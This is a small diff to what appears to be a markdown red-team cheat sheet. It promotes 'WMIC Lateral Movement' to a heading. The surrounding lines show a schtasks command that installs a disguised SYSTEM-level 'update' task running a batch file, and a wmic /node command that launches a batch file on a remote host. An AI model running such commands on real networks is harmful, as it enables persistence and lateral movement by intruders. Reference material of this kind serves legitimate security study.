@@ -215,7 +215,7 @@ schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.ba
 
 # Lateral Movement
 
-WMIC Lateral Movement
+#### WMIC Lateral Movement
 
 ```cpp
 wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
